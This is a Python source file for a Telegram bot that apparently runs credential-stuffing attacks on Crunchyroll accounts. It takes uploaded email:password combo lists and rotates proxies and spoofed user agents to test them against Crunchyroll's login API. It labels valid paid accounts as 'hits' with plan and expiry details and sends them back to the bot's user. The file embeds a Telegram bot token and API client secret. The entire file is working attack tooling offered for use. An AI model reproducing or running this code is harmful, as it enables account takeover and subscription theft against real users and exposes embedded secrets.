import asyncio
import aiohttp
import uuid
import random
import io
import datetime
from datetime import datetime as dt
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# --- CONFIGURATION ---
BOT_TOKEN = "8519241969:AAFLDEntwYkoZ97AbyX2YEF-gBuPCcv8rvw"  # <--- PASTE YOUR TOKEN HERE
THREADS = 10  # Number of concurrent checks per user

# API CONSTANTS
CLIENT_ID = "ajcylfwdtjjtq7qpgks3"
CLIENT_SECRET = "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_"

USER_AGENTS = [
    "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
    "Crunchyroll/3.68.0 Android/9 okhttp/4.12.0",
    "Crunchyroll/3.48.2 Android/9 okhttp/4.12.0"
]

class CrunchyChecker:
    def __init__(self, combos, proxies=None):
        self.combos = combos
        self.proxies = proxies if proxies else []
        self.proxy_index = 0
        self.proxy_lock = asyncio.Lock()
        
        self.hits = []
        self.free = []
        self.bad = 0
        self.checked = 0
        self.total = len(combos)
        self.cpm = 0
        self.start_time = 0
        
        self.lock = asyncio.Lock()

    async def get_next_proxy(self):
        if not self.proxies:
            return None
        async with self.proxy_lock:
            proxy = self.proxies[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
            return f"http://{proxy}"

    def generate_device_id(self):
        return str(uuid.uuid4())

    async def check_account(self, session, email, password):
        proxy_url = await self.get_next_proxy()
        device_id = self.generate_device_id()
        user_agent = random.choice(USER_AGENTS)
        
        # Prepare proxy for aiohttp
        proxy_conn = proxy_url if proxy_url else None

        try:
            # Step 1: Auth
            url = "https://beta-api.crunchyroll.com/auth/v1/token"
            data = {
                'grant_type': 'password',
                'username': email,
                'password': password,
                'scope': 'offline_access',
                'client_id': CLIENT_ID,
                'client_secret': CLIENT_SECRET,
                'device_type': 'SamsungTV',
                'device_id': device_id,
                'device_name': 'Checker'
            }
            headers = {
                'User-Agent': user_agent,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'beta-api.crunchyroll.com',
            }

            async with session.post(url, data=data, headers=headers, proxy=proxy_conn, timeout=15) as resp:
                if resp.status != 200:
                    return {'status': 'bad', 'email': email}
                text = await resp.text()
                if 'error' in text or 'access_token' not in text:
                    return {'status': 'bad', 'email': email}
                resp_json = await resp.json()
                token = resp_json.get('access_token')

            # Step 2: Account Info
            headers2 = {
                'User-Agent': user_agent,
                'Authorization': f'Bearer {token}',
                'Host': 'beta-api.crunchyroll.com',
            }
            url2 = "https://beta-api.crunchyroll.com/accounts/v1/me"
            async with session.get(url2, headers=headers2, proxy=proxy_conn, timeout=15) as resp:
                if resp.status != 200: return {'status': 'bad', 'email': email}
                account_data = await resp.json()
            
            external_id = account_data.get('external_id', '')
            email_verified = account_data.get('email_verified', False)

            # Step 3: Benefits
            url3 = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits"
            async with session.get(url3, headers=headers2, proxy=proxy_conn, timeout=15) as resp:
                if resp.status == 404: 
                    # No subscription found usually means free account
                    return {'status': 'free', 'email': email, 'password': password}
                    
                benefits_data = await resp.json()

            total_benefits = benefits_data.get('total', 0)
            if total_benefits == 0:
                return {'status': 'free', 'email': email, 'password': password}

            # Identify Plan
            streams = None
            if 'items' in benefits_data:
                for item in benefits_data['items']:
                    benefit = item.get('benefit', '')
                    if 'concurrent_streams' in benefit:
                        try:
                            if 'concurrent_streams.' in benefit:
                                temp = benefit.split('concurrent_streams.')[1]
                                streams = ''.join(filter(str.isdigit, temp[:2]))
                                break
                        except: pass

            if streams == '1': plan_type = 'FAN'
            elif streams == '4': plan_type = 'MEGA FAN'
            elif streams == '6': plan_type = 'ULTIMATE FAN'
            else: plan_type = 'PREMIUM'

            # Step 4: Renewal Date
            url4 = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}"
            async with session.get(url4, headers=headers2, proxy=proxy_conn, timeout=15) as resp:
                renewal_data = await resp.json()

            next_renewal = renewal_data.get('next_renewal_date', '')
            expiry_date = 'Lifetime'
            remaining_days = '∞'

            if next_renewal:
                try:
                    expiry_date = next_renewal.split('T')[0]
                    exp_dt = dt.strptime(expiry_date, '%Y-%m-%d')
                    remaining_days = (exp_dt - dt.now()).days
                    if remaining_days < 0:
                        return {'status': 'expired', 'email': email, 'password': password}
                except: pass

            return {
                'status': 'hit',
                'email': email,
                'password': password,
                'plan': plan_type,
                'expiry': expiry_date,
                'days': remaining_days,
                'verified': email_verified
            }

        except Exception as e:
            # print(f"Error: {e}") # Debug
            return {'status': 'error', 'email': email}

    async def worker(self, session, context, chat_id, message_id):
        while True:
            try:
                combo = self.combos.pop(0)
            except IndexError:
                break

            parts = combo.split(':', 1)
            if len(parts) != 2:
                async with self.lock:
                    self.bad += 1
                    self.checked += 1
                continue

            email, password = parts[0].strip(), parts[1].strip()
            result = await self.check_account(session, email, password)

            async with self.lock:
                self.checked += 1
                if result['status'] == 'hit':
                    self.hits.append(result)
                    # Try to send hit notification (non-blocking ideally, but simple way here)
                    try:
                        hit_text = (
                            f"✅ *HIT FOUND*\n\n"
                            f"📧 `{email}:{password}`\n"
                            f"💎 Plan: {result['plan']}\n"
                            f"📅 Expiry: {result['expiry']}\n"
                            f"⏳ Days: {result['days']}"
                        )
                        await context.bot.send_message(chat_id=chat_id, text=hit_text, parse_mode='Markdown')
                    except: pass
                elif result['status'] == 'free':
                    self.free.append(result)
                else:
                    self.bad += 1

    async def run(self, context: ContextTypes.DEFAULT_TYPE, chat_id, message_id):
        self.start_time = datetime.datetime.now().timestamp()
        connector = aiohttp.TCPConnector(limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(THREADS):
                task = asyncio.create_task(self.worker(session, context, chat_id, message_id))
                tasks.append(task)
            
            # Stats Updater Loop
            while not all(t.done() for t in tasks):
                await asyncio.sleep(4) # Update every 4 seconds to avoid TG spam limits
                elapsed = datetime.datetime.now().timestamp() - self.start_time
                if elapsed > 0:
                    self.cpm = int((self.checked / elapsed) * 60)
                
                text = (
                    f"⚡ *CRUNCHYROLL CHECKER*\n\n"
                    f"📊 *Progress:* `{self.checked}/{self.total}`\n"
                    f"⚡ *CPM:* `{self.cpm}`\n"
                    f"✅ *Hits:* `{len(self.hits)}`\n"
                    f"🆓 *Free:* `{len(self.free)}`\n"
                    f"❌ *Bad:* `{self.bad}`"
                )
                try:
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode='Markdown')
                except: pass

            await asyncio.gather(*tasks)

        # Final Update
        elapsed = datetime.datetime.now().timestamp() - self.start_time
        final_cpm = int((self.checked / elapsed) * 60) if elapsed > 0 else 0
        text = (
            f"🏁 *CHECK COMPLETE*\n\n"
            f"✅ *Hits:* `{len(self.hits)}`\n"
            f"🆓 *Free:* `{len(self.free)}`\n"
            f"❌ *Bad:* `{self.bad}`\n"
            f"⚡ *Avg CPM:* `{final_cpm}`"
        )
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode='Markdown')

        # Send file if hits
        if self.hits:
            output = ""
            for h in self.hits:
                output += f"Email: {h['email']}\nPass: {h['password']}\nPlan: {h['plan']} | Expiry: {h['expiry']}\n{'='*40}\n"
            
            bio = io.BytesIO(output.encode('utf-8'))
            bio.name = "hits.txt"
            await context.bot.send_document(chat_id=chat_id, document=bio, caption="✅ Here are your hits!")

# --- Bot Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to Crunchyroll Checker Bot!\n\n"
        "Please send your combo list file (.txt)."
    )
    context.user_data['state'] = 'WAITING_COMBO'

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('state', 'WAITING_COMBO')
    
    if state == 'WAITING_COMBO':
        file = await update.message.document.get_file()
        await file.download_to_drive("combo_temp.txt")
        context.user_data['combo_file'] = "combo_temp.txt"
        
        keyboard = [
            [InlineKeyboardButton("✅ Yes", callback_data="proxy_yes"),
             InlineKeyboardButton("❌ No", callback_data="proxy_no")]
        ]
        await update.message.reply_text("📂 File received. Do you want to use proxies?", reply_markup=InlineKeyboardMarkup(keyboard))
        context.user_data['state'] = 'WAITING_PROXY_CHOICE'

    elif state == 'WAITING_PROXY_FILE':
        file = await update.message.document.get_file()
        await file.download_to_drive("proxy_temp.txt")
        context.user_data['proxy_file'] = "proxy_temp.txt"
        
        await update.message.reply_text("🔌 Proxy file loaded. Starting check...")
        await start_checking(update, context)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "proxy_yes":
        await query.edit_message_text("🔌 Please send your proxy list file (ip:port or user:pass@ip:port).")
        context.user_data['state'] = 'WAITING_PROXY_FILE'
        context.user_data['use_proxy'] = True
    
    elif query.data == "proxy_no":
        await query.edit_message_text("🚀 Starting check without proxies...")
        context.user_data['use_proxy'] = False
        await start_checking(update, context)

async def start_checking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    # Load Combos
    try:
        with open(context.user_data['combo_file'], 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line.strip()]
    except Exception as e:
        await context.bot.send_message(chat_id, f"Error loading combo file: {e}")
        return

    # Load Proxies
    proxies = []
    if context.user_data.get('use_proxy'):
        try:
            with open(context.user_data['proxy_file'], 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
        except: pass

    msg = await context.bot.send_message(chat_id, "⏳ Initializing checker...")
    
    checker = CrunchyChecker(combos, proxies)
    
    # Run the checker in the background loop
    asyncio.create_task(checker.run(context, chat_id, msg.message_id))
    
    # Clean up state
    context.user_data.clear()

def main():
    print("Bot is running...")
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
    application.add_handler(CallbackQueryHandler(button_handler))

    application.run_polling()

if __name__ == "__main__":
    main()